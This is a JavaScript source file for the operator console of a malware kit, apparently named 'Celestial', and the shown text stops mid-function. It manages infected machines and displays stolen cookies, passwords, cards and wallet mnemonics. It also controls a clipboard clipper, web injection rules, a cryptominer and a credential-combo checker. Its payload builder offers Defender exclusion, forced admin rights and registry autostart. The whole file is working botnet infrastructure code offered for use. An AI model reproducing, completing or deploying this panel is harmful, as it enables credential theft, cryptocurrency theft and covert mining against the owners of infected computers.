const socket = io();
let operatorKey = '';
let clients = [];
let selectedClientId = null;
let currentView = 'clients';
let currentLang = localStorage.getItem('celestial.lang') || 'en';
let currentTheme = localStorage.getItem('celestial.theme') || 'light';
const notifications = [];
const caches = { recovery: [], wallets: [], proxy: [], webinjection: [], sorter: [], autotasks: [], filestore: [], checkersessions: [] };

const $ = (id) => document.getElementById(id);
const el = (tag, props = {}, children = []) => {
  const n = document.createElement(tag);
  Object.assign(n, props);
  children.forEach(c => n.appendChild(typeof c === 'string' ? document.createTextNode(c) : c));
  return n;
};
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const svg = (path) => {
  const s = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  s.setAttribute('viewBox','0 0 24 24'); s.setAttribute('fill','none');
  s.setAttribute('stroke','currentColor'); s.setAttribute('stroke-width','1.8');
  s.innerHTML = path;
  return s;
};

/* ===== i18n ===== */
const I18N = {
  en: {
    signin:'Sign in', operatorKey:'Operator Key', operatorKeyPh:'Enter operator key', signIn:'Sign In',
    needAccess:'Need access?', contactAdmin:'Contact admin',
    home:'Home', dashboard:'Dashboard', clients:'Clients', recovery:'Recovery',
    wallets:'Wallets', proxy:'Proxy', clipper:'Clipper', webinjection:'Web Injection',
    sorter:'Sorter', autotasks:'Auto Tasks', filestore:'File Store', miner:'Miner',
    checker:'Checker', checkersessions:'Checker Sessions', builder:'Builder',
    notifications:'Notifications', theme:'Theme', logout:'Logout', profile:'Profile',
    all:'All', columns:'Columns', clearAll:'Clear all',
    baseThemes:'Base', darkThemes:'Dark', gradientThemes:'Nitro Gradients', language:'Language',
    connectedClients:'Connected Clients', recoveryLogs:'Recovery Logs', walletLogs:'Wallet Logs',
    clientBuilder:'Client Builder', autoTasksTitle:'Auto Tasks',
    search:'Search', searchClients:'Search clients...', searchRecovery:'Search recovery logs...',
    searchWallets:'Search wallet logs...', searchProxies:'Search proxies...', searchRules:'Search rules...',
    searchFiles:'Search files...', searchSessions:'Search sessions...', searchJobs:'Search jobs...',
    noClients:'No clients connected.', noData:'No data.', noSorter:'No sorter groups.',
    noTasks:'No tasks.', noMiningJobs:'No mining jobs.', noClipperEntries:'No clipper entries.',
    noRules:'No rules.', noSessions:'No sessions.', noFiles:'No files.',
    refresh:'Refresh', addLog:'Add Log', addWallet:'Add Wallet', addProxy:'Add Proxy',
    addRule:'Add Rule', addGroup:'Add Group', addTask:'Add Task', addJob:'Add Job',
    addSession:'Add Session', addEntry:'Add Entry', upload:'Upload',
    buildClient:'Build Client', save:'Save', cancel:'Cancel', entries:'entries',
    totalLogs:'Total Logs', cookies:'Cookies', passwords:'Passwords', cards:'Cards', applications:'Applications',
    atomic:'Atomic', exodus:'Exodus', phantom:'Phantom', metamask:'MetaMask', trustWallet:'Trust Wallet',
    onlineProxies:'Online Proxies', offlineProxies:'Offline Proxies', totalProxies:'Total Proxies',
    workers:'Workers', totalFiles:'Total Files', totalSize:'Total Size', recent:'Recent (7D)',
    activeMiners:'Active Miners', totalHashrate:'Total Hashrate', cpuHashrate:'CPU Hashrate',
    gpuHashrate:'GPU Hashrate', accepted:'Accepted', rejected:'Rejected', totalRuntime:'Total Runtime',
    totalTasks:'Total Tasks', active:'Active', onceTasks:'Once Tasks', executions:'Executions',
    selectClient:'Select a client first', sent:'Sent', added:'Added', loadFailed:'Load failed',
    invalidKey:'Invalid key', welcome:'Welcome', newClient:'New client connected',
    notifEmpty:'No notifications yet.', command:'Command',
    general:'General', options:'Options', install:'Install', final:'Final',
    clientTag:'Client Tag', note:'Note', mutex:'Mutex',
    defenderExclusion:'Defender Exclusion', forceAdmin:'Force Admin', debug:'Debug',
    enabled:'Enabled', location:'Location', folder:'Folder', filename:'Filename',
    registry:'Registry Autostart', recentBuilds:'Recent builds', buildCreated:'Build created',
    archivePassword:'Archive password',
    colStatus:'Status', colFirstSeen:'First Seen', colIP:'IP', colTag:'Tag', colNote:'Note',
    colUsername:'Username', colMachineName:'Machine Name', colActiveWindow:'Active Window',
    colAntiVirus:'Anti-Virus', colOS:'OS', colCountry:'Country', colUser:'User', colMachine:'Machine',
    colType:'Type', colContents:'Contents', colReceived:'Received', colWallet:'Wallet',
    colPassword:'Password', colMnemonic:'Mnemonic', colProxyHost:'Proxy Host', colPort:'Port',
    colHwid:'Hwid', colRule:'Rule', colUrlPattern:'URL Pattern', colEnabled:'Enabled',
    colReplacement:'Replacement', colName:'Name', colFilter:'Filter', colFormat:'Format',
    colDetail:'Detail', colFired:'Fired', colSize:'Size', colUploaded:'Uploaded',
    colService:'Service', colCombo:'Combo', colStatusSession:'Status', colChecked:'Checked',
    colMode:'Mode', colMatch:'Match', colReplace:'Replace', colLabel:'Label',
    colJobName:'User', colPool:'Machine', colWalletCol:'Wallet', colRole:'Role',
    rowsPerPage:'Rows per page', pageOf:'Page {x} of {y}', rowsSelected:'{x} of {y} row(s) selected',
    pageFirst:'‹', pagePrev:'›', trigger:'TRIGGER', onConnect:'On connect', inChain:'{x} in chain',
    addClipperEntry:'Add Clipper Entry', match:'Match (regex)', replacement:'Replacement',
    groupName:'Group Name', taskName:'Task Name', jobName:'Job Name', pool:'Pool URL', wallet:'Wallet',
    ruleName:'Rule Name', urlPattern:'URL Pattern', originalCode:'Original Code', replacementCode:'Replacement Code',
    service:'Service', combo:'Combo (email:pass)', status:'Status', size:'Size',
    pendingFeature:'Feature pending', settings:'Settings', notImplemented:'Not implemented.'
  },
  ru: {
    signin:'Вход', operatorKey:'Ключ оператора', operatorKeyPh:'Введите ключ', signIn:'Войти',
    needAccess:'Нет доступа?', contactAdmin:'Связаться с админом',
    home:'Главная', dashboard:'Панель', clients:'Клиенты', recovery:'Восстановление',
    wallets:'Кошельки', proxy:'Прокси', clipper:'Клиппер', webinjection:'Web-инъекции',
    sorter:'Сортировщик', autotasks:'Автозадачи', filestore:'Хранилище', miner:'Майнер',
    checker:'Чекер', checkersessions:'Сессии чекера', builder:'Сборщик',
    notifications:'Уведомления', theme:'Тема', logout:'Выход', profile:'Профиль',
    all:'Все', columns:'Столбцы', clearAll:'Очистить всё',
    baseThemes:'Базовые', darkThemes:'Тёмные', gradientThemes:'Градиенты Nitro', language:'Язык',
    connectedClients:'Подключённые клиенты', recoveryLogs:'Журнал восстановления', walletLogs:'Журнал кошельков',
    clientBuilder:'Сборщик клиента', autoTasksTitle:'Автозадачи',
    search:'Поиск', searchClients:'Поиск клиентов...', searchRecovery:'Поиск логов...',
    searchWallets:'Поиск кошельков...', searchProxies:'Поиск прокси...', searchRules:'Поиск правил...',
    searchFiles:'Поиск файлов...', searchSessions:'Поиск сессий...', searchJobs:'Поиск заданий...',
    noClients:'Нет подключённых клиентов.', noData:'Нет данных.', noSorter:'Нет групп.',
    noTasks:'Нет задач.', noMiningJobs:'Нет заданий.', noClipperEntries:'Нет записей.',
    noRules:'Нет правил.', noSessions:'Нет сессий.', noFiles:'Нет файлов.',
    refresh:'Обновить', addLog:'Добавить', addWallet:'Добавить', addProxy:'Добавить',
    addRule:'Добавить правило', addGroup:'Добавить группу', addTask:'Добавить задачу', addJob:'Добавить задание',
    addSession:'Добавить', addEntry:'Добавить', upload:'Загрузить',
    buildClient:'Собрать клиент', save:'Сохранить', cancel:'Отмена', entries:'записей',
    totalLogs:'Всего', cookies:'Куки', passwords:'Пароли', cards:'Карты', applications:'Приложения',
    atomic:'Atomic', exodus:'Exodus', phantom:'Phantom', metamask:'MetaMask', trustWallet:'Trust Wallet',
    onlineProxies:'Онлайн', offlineProxies:'Офлайн', totalProxies:'Всего',
    workers:'Воркеры', totalFiles:'Файлов', totalSize:'Размер', recent:'7 дней',
    activeMiners:'Активные', totalHashrate:'Хешрейт', cpuHashrate:'CPU', gpuHashrate:'GPU',
    accepted:'Принято', rejected:'Отклонено', totalRuntime:'Время',
    totalTasks:'Задач', active:'Активные', onceTasks:'Одноразовые', executions:'Запусков',
    selectClient:'Выберите клиента', sent:'Отправлено', added:'Добавлено', loadFailed:'Ошибка загрузки',
    invalidKey:'Неверный ключ', welcome:'Добро пожаловать', newClient:'Новый клиент',
    notifEmpty:'Уведомлений нет.', command:'Команда',
    general:'Общие', options:'Опции', install:'Установка', final:'Финал',
    clientTag:'Тег клиента', note:'Заметка', mutex:'Мутекс',
    defenderExclusion:'Defender', forceAdmin:'Админ', debug:'Отладка',
    enabled:'Включено', location:'Расположение', folder:'Папка', filename:'Файл',
    registry:'Автозапуск', recentBuilds:'Сборки', buildCreated:'Сборка создана',
    archivePassword:'Пароль архива',
    colStatus:'Статус', colFirstSeen:'Первый вход', colIP:'IP', colTag:'Тег', colNote:'Заметка',
    colUsername:'Имя', colMachineName:'Машина', colActiveWindow:'Окно',
    colAntiVirus:'Антивирус', colOS:'ОС', colCountry:'Страна', colUser:'Польз.', colMachine:'Машина',
    colType:'Тип', colContents:'Содержимое', colReceived:'Получено', colWallet:'Кошелёк',
    colPassword:'Пароль', colMnemonic:'Мнемоника', colProxyHost:'Хост', colPort:'Порт',
    colHwid:'HWID', colRule:'Правило', colUrlPattern:'URL', colEnabled:'Вкл.',
    colReplacement:'Замена', colName:'Имя', colFilter:'Фильтр', colFormat:'Формат',
    colDetail:'Детали', colFired:'Запуск', colSize:'Размер', colUploaded:'Загружено',
    colService:'Сервис', colCombo:'Комбо', colStatusSession:'Статус', colChecked:'Проверено',
    colMode:'Режим', colMatch:'Match', colReplace:'Замена', colLabel:'Метка',
    colJobName:'Польз.', colPool:'Машина', colWalletCol:'Кошелёк', colRole:'Роль',
    rowsPerPage:'Строк на стр.', pageOf:'Стр. {x} из {y}', rowsSelected:'{x} из {y} строк',
    pageFirst:'‹', pagePrev:'›', trigger:'ТРИГГЕР', onConnect:'При подключении', inChain:'{x} в цепочке',
    addClipperEntry:'Новая запись', match:'Совпадение (regex)', replacement:'Замена',
    groupName:'Имя группы', taskName:'Имя задачи', jobName:'Имя задания', pool:'URL пула', wallet:'Кошелёк',
    ruleName:'Имя правила', urlPattern:'URL-шаблон', originalCode:'Исходный код', replacementCode:'Код замены',
    service:'Сервис', combo:'Комбо (email:pass)', status:'Статус', size:'Размер',
    pendingFeature:'Функция в разработке', settings:'Настройки', notImplemented:'Не реализовано.'
  },
  zh: {
    signin:'登录', operatorKey:'操作员密钥', operatorKeyPh:'输入密钥', signIn:'登录',
    needAccess:'没有权限？', contactAdmin:'联系管理员',
    home:'主页', dashboard:'仪表盘', clients:'客户端', recovery:'恢复',
    wallets:'钱包', proxy:'代理', clipper:'剪贴板', webinjection:'网页注入',
    sorter:'分类器', autotasks:'自动任务', filestore:'文件存储', miner:'挖矿',
    checker:'检查器', checkersessions:'检查会话', builder:'构建器',
    notifications:'通知', theme:'主题', logout:'退出', profile:'资料',
    all:'全部', columns:'列', clearAll:'清空全部',
    baseThemes:'基础', darkThemes:'深色', gradientThemes:'Nitro 渐变', language:'语言',
    connectedClients:'已连接客户端', recoveryLogs:'恢复日志', walletLogs:'钱包日志',
    clientBuilder:'客户端构建器', autoTasksTitle:'自动任务',
    search:'搜索', searchClients:'搜索客户端...', searchRecovery:'搜索日志...',
    searchWallets:'搜索钱包...', searchProxies:'搜索代理...', searchRules:'搜索规则...',
    searchFiles:'搜索文件...', searchSessions:'搜索会话...', searchJobs:'搜索作业...',
    noClients:'无客户端连接。', noData:'无数据。', noSorter:'无分组。',
    noTasks:'无任务。', noMiningJobs:'无作业。', noClipperEntries:'无记录。',
    noRules:'无规则。', noSessions:'无会话。', noFiles:'无文件。',
    refresh:'刷新', addLog:'添加日志', addWallet:'添加钱包', addProxy:'添加代理',
    addRule:'添加规则', addGroup:'添加分组', addTask:'添加任务', addJob:'添加作业',
    addSession:'添加会话', addEntry:'添加记录', upload:'上传',
    buildClient:'构建客户端', save:'保存', cancel:'取消', entries:'条',
    totalLogs:'总日志', cookies:'Cookie', passwords:'密码', cards:'卡片', applications:'应用',
    atomic:'Atomic', exodus:'Exodus', phantom:'Phantom', metamask:'MetaMask', trustWallet:'Trust Wallet',
    onlineProxies:'在线代理', offlineProxies:'离线代理', totalProxies:'总代理',
    workers:'工作线程', totalFiles:'文件总数', totalSize:'总大小', recent:'最近7天',
    activeMiners:'活跃矿机', totalHashrate:'总算力', cpuHashrate:'CPU', gpuHashrate:'GPU',
    accepted:'已接受', rejected:'已拒绝', totalRuntime:'运行时间',
    totalTasks:'任务总数', active:'活跃', onceTasks:'一次性', executions:'执行次数',
    selectClient:'请先选择客户端', sent:'已发送', added:'已添加', loadFailed:'加载失败',
    invalidKey:'密钥无效', welcome:'欢迎', newClient:'新客户端已连接',
    notifEmpty:'暂无通知。', command:'命令',
    general:'通用', options:'选项', install:'安装', final:'最终',
    clientTag:'客户端标签', note:'备注', mutex:'互斥锁',
    defenderExclusion:'Defender 排除', forceAdmin:'强制管理员', debug:'调试',
    enabled:'启用', location:'位置', folder:'文件夹', filename:'文件名',
    registry:'注册表启动', recentBuilds:'最近构建', buildCreated:'构建已创建',
    archivePassword:'压缩包密码',
    colStatus:'状态', colFirstSeen:'首次出现', colIP:'IP', colTag:'标签', colNote:'备注',
    colUsername:'用户名', colMachineName:'机器名', colActiveWindow:'活动窗口',
    colAntiVirus:'杀毒', colOS:'系统', colCountry:'国家', colUser:'用户', colMachine:'机器',
    colType:'类型', colContents:'内容', colReceived:'接收', colWallet:'钱包',
    colPassword:'密码', colMnemonic:'助记词', colProxyHost:'主机', colPort:'端口',
    colHwid:'HWID', colRule:'规则', colUrlPattern:'URL', colEnabled:'启用',
    colReplacement:'替换', colName:'名称', colFilter:'过滤器', colFormat:'格式',
    colDetail:'详情', colFired:'已触发', colSize:'大小', colUploaded:'已上传',
    colService:'服务', colCombo:'组合', colStatusSession:'状态', colChecked:'已检查',
    colMode:'模式', colMatch:'匹配', colReplace:'替换', colLabel:'标签',
    colJobName:'用户', colPool:'机器', colWalletCol:'钱包', colRole:'角色',
    rowsPerPage:'每页行数', pageOf:'第 {x} 页 / 共 {y} 页', rowsSelected:'已选 {x} 行 / 共 {y} 行',
    pageFirst:'‹', pagePrev:'›', trigger:'触发器', onConnect:'连接时', inChain:'{x} 个链路',
    addClipperEntry:'添加记录', match:'匹配 (regex)', replacement:'替换',
    groupName:'分组名称', taskName:'任务名称', jobName:'作业名称', pool:'矿池 URL', wallet:'钱包',
    ruleName:'规则名称', urlPattern:'URL 模式', originalCode:'原始代码', replacementCode:'替换代码',
    service:'服务', combo:'组合 (email:pass)', status:'状态', size:'大小',
    pendingFeature:'功能开发中', settings:'设置', notImplemented:'未实现。'
  }
};

function t(k) { return (I18N[currentLang] && I18N[currentLang][k]) || I18N.en[k] || k; }
function fmt(k, vars) {
  let s = t(k);
  Object.entries(vars || {}).forEach(([key, val]) => { s = s.replace('{' + key + '}', val); });
  return s;
}

function applyLang(code) {
  currentLang = code;
  localStorage.setItem('celestial.lang', code);
  document.documentElement.lang = code;
  document.querySelectorAll('[data-i18n]').forEach(n => { n.textContent = t(n.dataset.i18n); });
  document.querySelectorAll('[data-i18n-placeholder]').forEach(n => { n.placeholder = t(n.dataset.i18nPlaceholder); });
  document.querySelectorAll('#loginLangs button, #themeLangs button').forEach(b => b.classList.toggle('active', b.dataset.lang === code));
  if (!$('app').classList.contains('hidden')) loadView(currentView);
}

/* ===== Themes ===== */
const THEMES = [
  { id:'light',        label:'Light',    group:'base', preview:'linear-gradient(135deg,#ffffff,#f3f4f6)' },
  { id:'sepia',        label:'Sepia',    group:'base', preview:'linear-gradient(135deg,#fbf6ee,#e2d3b3)' },
  { id:'solarized',    label:'Solarized',group:'base', preview:'linear-gradient(135deg,#fdf6e3,#268bd2)' },
  { id:'dark',         label:'Dark',     group:'dark', preview:'linear-gradient(135deg,#1a1d21,#2b3038)' },
  { id:'midnight',     label:'Midnight', group:'dark', preview:'linear-gradient(135deg,#0f172a,#38bdf8)' },
  { id:'nord',         label:'Nord',     group:'dark', preview:'linear-gradient(135deg,#2e3440,#88c0d0)' },
  { id:'dracula',      label:'Dracula',  group:'dark', preview:'linear-gradient(135deg,#282a36,#bd93f9)' },
  { id:'tokyo',        label:'Tokyo',    group:'dark', preview:'linear-gradient(135deg,#1a1b26,#7aa2f7)' },
  { id:'catppuccin',   label:'Catppuccin',group:'dark',preview:'linear-gradient(135deg,#1e1e2e,#cba6f7)' },
  { id:'gruvbox',      label:'Gruvbox',  group:'dark', preview:'linear-gradient(135deg,#282828,#fabd2f)' },
  { id:'rosepine',     label:'Rosé Pine',group:'dark', preview:'linear-gradient(135deg,#191724,#eb6f92)' },
  { id:'onedark',      label:'One Dark', group:'dark', preview:'linear-gradient(135deg,#282c34,#61afef)' },
  { id:'nitro-aurora',    label:'Aurora',    group:'gradient', preview:'linear-gradient(135deg,#667eea,#764ba2,#22d3ee)' },
  { id:'nitro-sunset',    label:'Sunset',    group:'gradient', preview:'linear-gradient(135deg,#fa709a,#fee140,#ff6b6b)' },
  { id:'nitro-ocean',     label:'Ocean',     group:'gradient', preview:'linear-gradient(135deg,#2193b0,#6dd5ed,#1e3c72)' },
  { id:'nitro-forest',    label:'Forest',    group:'gradient', preview:'linear-gradient(135deg,#11998e,#38ef7d,#085078)' },
  { id:'nitro-rose',      label:'Rose',      group:'gradient', preview:'linear-gradient(135deg,#ee9ca7,#c471ed,#f64f59)' },
  { id:'nitro-cyber',     label:'Cyber',     group:'gradient', preview:'linear-gradient(135deg,#ff00cc,#333399,#00f0ff)' },
  { id:'nitro-candy',     label:'Candy',     group:'gradient', preview:'linear-gradient(135deg,#a18cd1,#fbc2eb,#ffecd2)' },
  { id:'nitro-flame',     label:'Flame',     group:'gradient', preview:'linear-gradient(135deg,#f12711,#f5af19,#f12711)' },
  { id:'nitro-mono',      label:'Mono',      group:'gradient', preview:'linear-gradient(135deg,#232526,#5c5f61,#414345)' },
  { id:'nitro-neon',      label:'Neon',      group:'gradient', preview:'linear-gradient(135deg,#00f5d4,#00bbf9,#9b5de5,#f15bb5)' },
  { id:'nitro-matrix',    label:'Matrix',    group:'gradient', preview:'linear-gradient(135deg,#0f0c29,#00ff41,#302b63)' },
  { id:'nitro-vaporwave', label:'Vaporwave', group:'gradient', preview:'linear-gradient(135deg,#ff6ec4,#7873f5,#4ade80)' },
  { id:'nitro-synthwave', label:'Synthwave', group:'gradient', preview:'linear-gradient(135deg,#fc466b,#3f5efb)' },
  { id:'nitro-galaxy',    label:'Galaxy',    group:'gradient', preview:'linear-gradient(135deg,#0f0c29,#302b63,#6a11cb,#2575fc)' },
  { id:'nitro-tropical',  label:'Tropical',  group:'gradient', preview:'linear-gradient(135deg,#00b4db,#00f260,#0575e6)' },
  { id:'nitro-ember',     label:'Ember',     group:'gradient', preview:'linear-gradient(135deg,#1a0000,#ff4500,#ff8c00)' },
  { id:'nitro-ice',       label:'Ice',       group:'gradient', preview:'linear-gradient(135deg,#83a4d4,#b6fbff,#e0f7ff)' },
  { id:'nitro-sakura',    label:'Sakura',    group:'gradient', preview:'linear-gradient(135deg,#ffdde1,#ee9ca7,#ffb7c5)' },
  { id:'nitro-royal',     label:'Royal',     group:'gradient', preview:'linear-gradient(135deg,#1a2a6c,#b21f1f,#fdbb2d)' },
  { id:'nitro-lava',      label:'Lava',      group:'gradient', preview:'linear-gradient(135deg,#200122,#6f0000,#ff512f,#dd2476)' },
  { id:'nitro-mint',      label:'Mint',      group:'gradient', preview:'linear-gradient(135deg,#a8ff78,#78ffd6,#43e97b)' },
  { id:'nitro-cotton',    label:'Cotton',    group:'gradient', preview:'linear-gradient(135deg,#ff9a9e,#fecfef,#a1c4fd)' },
  { id:'nitro-cosmic',    label:'Cosmic',    group:'gradient', preview:'linear-gradient(135deg,#20002c,#cbb4d4,#20002c)' },
  { id:'nitro-rainbow',   label:'Rainbow',   group:'gradient', preview:'linear-gradient(90deg,#ff0000,#ff8c00,#ffee00,#00c853,#00b0ff,#d500f9)' }
];

function applyTheme(id) {
  currentTheme = id;
  localStorage.setItem('celestial.theme', id);
  document.body.setAttribute('data-theme', id);
  document.querySelectorAll('.theme-swatch').forEach(s => s.classList.toggle('active', s.dataset.theme === id));
}

function renderThemePanel() {
  const base = $('themeBase'), dark = $('themeDark'), grad = $('themeGradients');
  base.innerHTML = ''; dark.innerHTML = ''; grad.innerHTML = '';
  THEMES.forEach(th => {
    const sw = el('div', { className: 'theme-swatch' });
    sw.dataset.theme = th.id;
    sw.style.background = th.preview;
    sw.style.backgroundSize = '200% 200%';
    sw.appendChild(el('div', { className: 'ts-check' }, ['✓']));
    sw.appendChild(el('div', { className: 'ts-label' }, [th.label]));
    sw.onclick = () => applyTheme(th.id);
    if (th.group === 'gradient') grad.appendChild(sw);
    else if (th.group === 'dark') dark.appendChild(sw);
    else base.appendChild(sw);
  });
  applyTheme(currentTheme);
}

/* ===== Notifications ===== */
function addNotification(title, msg) {
  notifications.unshift({ id: Date.now().toString(36), title, msg, time: new Date() });
  if (notifications.length > 100) notifications.pop();
  renderNotifications();
  toast(title + ': ' + msg, 3000);
}
function renderNotifications() {
  const list = $('notifList'), badge = $('notifBadge');
  if (!notifications.length) {
    list.innerHTML = '';
    list.appendChild(el('div', { className: 'notif-empty' }, [t('notifEmpty')]));
    badge.classList.add('hidden');
    return;
  }
  badge.textContent = notifications.length;
  badge.classList.remove('hidden');
  list.innerHTML = '';
  notifications.forEach(n => {
    const item = el('div', { className: 'notif-item' });
    item.appendChild(el('div', { className: 'ni-dot' }));
    const body = el('div', { className: 'ni-body' });
    body.appendChild(el('div', { className: 'ni-title' }, [n.title]));
    body.appendChild(el('div', { className: 'ni-msg' }, [n.msg]));
    body.appendChild(el('div', { className: 'ni-time' }, [n.time.toLocaleTimeString()]));
    item.appendChild(body);
    list.appendChild(item);
  });
}

function toast(msg, ms = 2500) {
  const tt = $('toast');
  tt.textContent = msg;
  tt.classList.remove('hidden');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => tt.classList.add('hidden'), ms);
}

/* ===== Panels ===== */
function toggleNotifPanel() {
  const p = $('notifPanel'), o = $('themePanel');
  o.classList.add('hidden');
  p.classList.toggle('hidden');
}
function toggleThemePanel() {
  const p = $('themePanel'), o = $('notifPanel');
  o.classList.add('hidden');
  p.classList.toggle('hidden');
}

/* ===== Modal / Context ===== */
function openModal(title, bodyNodes) {
  $('modalTitle').textContent = title;
  const body = $('modalBody');
  body.innerHTML = '';
  bodyNodes.forEach(n => body.appendChild(n));
  $('modal').classList.remove('hidden');
}
function closeModal() { $('modal').classList.add('hidden'); hideCtx(); }
function hideCtx() { $('ctxmenu').classList.add('hidden'); }

function showCtxMenu(e, items) {
  const m = $('ctxmenu');
  m.innerHTML = '';
  const build = (parent, list) => {
    list.forEach(it => {
      if (it.sep) { parent.appendChild(el('div', { className: 'ctx-sep' })); return; }
      const row = el('div', { className: 'ctx-item' + (it.sub ? ' has-sub' : '') });
      if (it.icon) row.appendChild(svg(it.icon));
      row.appendChild(document.createTextNode(it.label));
      if (it.sub) {
        row.appendChild(el('span', { className: 'arrow' }, ['›']));
        const sub = el('div', { className: 'ctx-sub' });
        build(sub, it.sub);
        row.appendChild(sub);
      } else if (it.action) {
        row.onclick = (ev) => { ev.stopPropagation(); it.action(); hideCtx(); };
      }
      parent.appendChild(row);
    });
  };
  build(m, items);
  m.classList.remove('hidden');
  const x = Math.min(e.clientX, window.innerWidth - 260);
  const y = Math.min(e.clientY, window.innerHeight - m.offsetHeight - 20);
  m.style.left = x + 'px';
  m.style.top = y + 'px';
}

/* ===== Auth ===== */
$('loginBtn').onclick = () => {
  const key = $('keyInput').value.trim();
  if (!key) return;
  operatorKey = key;
  socket.emit('operator:register', key);
};
$('keyInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('loginBtn').click(); });

socket.on('operator:ready', () => {
  $('login').classList.add('hidden');
  $('app').classList.remove('hidden');
  $('statusIndicator').className = 'status status-online';
  addNotification(t('notifications'), t('welcome'));
  loadView('clients');
});
socket.on('operator:error', () => { $('loginError').textContent = t('invalidKey'); });
$('logoutBtn').onclick = () => location.reload();

function api(path, opts = {}) {
  return fetch(path, { ...opts, headers: { 'content-type': 'application/json', 'x-operator-key': operatorKey, ...(opts.headers || {}) } }).then(r => r.json());
}

/* ===== Nav ===== */
document.querySelectorAll('#nav button').forEach(btn => {
  btn.onclick = () => loadView(btn.dataset.view);
});
function setActiveNav(view) {
  document.querySelectorAll('#nav button').forEach(b => b.classList.toggle('active', b.dataset.view === view));
}
const TITLES = {
  home:'home', dashboard:'dashboard', clients:'connectedClients', recovery:'recoveryLogs',
  wallets:'walletLogs', proxy:'proxy', clipper:'clipper', webinjection:'webinjection',
  sorter:'sorter', autotasks:'autoTasksTitle', filestore:'filestore', miner:'miner',
  checker:'checker', checkersessions:'checkersessions', builder:'clientBuilder'
};
function loadView(view) {
  currentView = view;
  setActiveNav(view);
  const root = $('viewRoot');
  root.innerHTML = '';
  $('viewTitle').textContent = t(TITLES[view] || view);
  const fn = views[view];
  if (fn) fn(root);
  else root.appendChild(el('div', { className: 'empty' }, [t('notImplemented')]));
}

/* ===== Helpers ===== */
function searchBar(placeholderKey, onInput) {
  const bar = el('div', { className: 'searchbar' });
  bar.appendChild(svg('<circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/>'));
  const inp = el('input', { placeholder: t(placeholderKey) });
  inp.oninput = () => onInput(inp.value.toLowerCase());
  bar.appendChild(inp);
  return { bar, inp };
}

function statCard(labelKey, value, pill) {
  const s = el('div', { className: 'stat' });
  if (pill !== undefined) s.appendChild(el('div', { className: 'stat-pill' }, [String(pill)]));
  s.appendChild(el('div', { className: 'stat-label' }, [t(labelKey)]));
  s.appendChild(el('div', { className: 'stat-value' }, [String(value)]));
  return s;
}

function dataTable(columns, rows, opts = {}) {
  const wrap = el('div', { className: 'table-wrap' });
  const tb = el('table');
  const thead = el('thead');
  const trh = el('tr');
  if (opts.checkbox) {
    const th = el('th', { className: 'td-check' });
    th.appendChild(el('input', { type: 'checkbox' }));
    trh.appendChild(th);
  }
  columns.forEach(col => {
    const th = el('th');
    const inner = el('span', { className: 'th-inner' });
    inner.appendChild(document.createTextNode(t(col.labelKey)));
    const s = el('span', { className: 'sort-ico' });
    s.innerHTML = '<svg viewBox="0 0 8 12" fill="currentColor"><path d="M4 0L7 4H1z"/><path d="M4 12L1 8h6z"/></svg>';
    inner.appendChild(s);
    th.appendChild(inner);
    trh.appendChild(th);
  });
  thead.appendChild(trh);
  tb.appendChild(thead);
  const tbody = el('tbody');
  if (!rows.length) {
    const tr = el('tr');
    const td = el('td', { colSpan: columns.length + (opts.checkbox ? 1 : 0) });
    td.appendChild(el('div', { className: 'empty' }, [t(opts.emptyKey || 'noData')]));
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    rows.forEach(row => {
      const tr = el('tr');
      if (opts.checkbox) {
        const td = el('td', { className: 'td-check' });
        td.appendChild(el('input', { type: 'checkbox' }));
        tr.appendChild(td);
      }
      columns.forEach(col => {
        const td = el('td');
        if (col.render) td.innerHTML = col.render(row);
        else td.textContent = row[col.key] ?? '';
        tr.appendChild(td);
      });
      if (opts.onContext) tr.oncontextmenu = (e) => { e.preventDefault(); showCtxMenu(e, opts.onContext(row)); };
      tbody.appendChild(tr);
    });
  }
  tb.appendChild(tbody);
  wrap.appendChild(tb);

  const pg = el('div', { className: 'pagination' });
  pg.appendChild(el('span', {}, [fmt('rowsSelected', { x: rows.length, y: rows.length })]));
  pg.appendChild(el('div', { className: 'spacer' }));
  pg.appendChild(el('span', {}, [t('rowsPerPage')]));
  const sel = el('select');
  ['10','25','50','100'].forEach(n => sel.appendChild(el('option', { value: n }, [n])));
  pg.appendChild(sel);
  pg.appendChild(el('span', {}, [fmt('pageOf', { x: 1, y: 1 })]));
  pg.appendChild(el('button', { className: 'page-btn' }, ['‹']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['›']));
  wrap.appendChild(pg);
  return wrap;
}

/* ===== Clients ===== */
socket.on('clients', (list) => {
  const prev = clients.length;
  clients = list;
  $('pillCount').textContent = `${list.length} | 0 | ${list.length}`;
  if (list.length > prev) addNotification(t('clients'), t('newClient'));
  if (currentView === 'clients') renderClients();
});

function renderClients() {
  const root = $('viewRoot');
  root.innerHTML = '';
  const search = searchBar('searchClients', (q) => {
    document.querySelectorAll('.client-row').forEach(r => {
      r.style.display = r.dataset.host.toLowerCase().includes(q) ? '' : 'none';
    });
  });
  root.appendChild(search.bar);

  const wrap = el('div', { className: 'table-wrap' });
  const tbl = el('table');
  const thead = el('thead');
  const trh = el('tr');
  const colDefs = [
    null,
    { labelKey: 'colStatus' }, { labelKey: 'colFirstSeen' }, { labelKey: 'colIP' },
    { labelKey: 'colTag' }, { labelKey: 'colNote' }, { labelKey: 'colUsername' },
    { labelKey: 'colMachineName' }, { labelKey: 'colActiveWindow' },
    { labelKey: 'colAntiVirus' }, { labelKey: 'colOS' }
  ];
  colDefs.forEach(c => {
    const th = el('th');
    if (c) {
      const inner = el('span', { className: 'th-inner' });
      inner.appendChild(document.createTextNode(t(c.labelKey)));
      const s = el('span', { className: 'sort-ico' });
      s.innerHTML = '<svg viewBox="0 0 8 12" fill="currentColor"><path d="M4 0L7 4H1z"/><path d="M4 12L1 8h6z"/></svg>';
      inner.appendChild(s);
      th.appendChild(inner);
    } else th.appendChild(el('input', { type: 'checkbox' }));
    trh.appendChild(th);
  });
  thead.appendChild(trh);
  tbl.appendChild(thead);
  const tbody = el('tbody');
  if (!clients.length) {
    const tr = el('tr');
    const td = el('td', { colSpan: colDefs.length });
    td.appendChild(el('div', { className: 'empty' }, [t('noClients')]));
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    clients.forEach(c => {
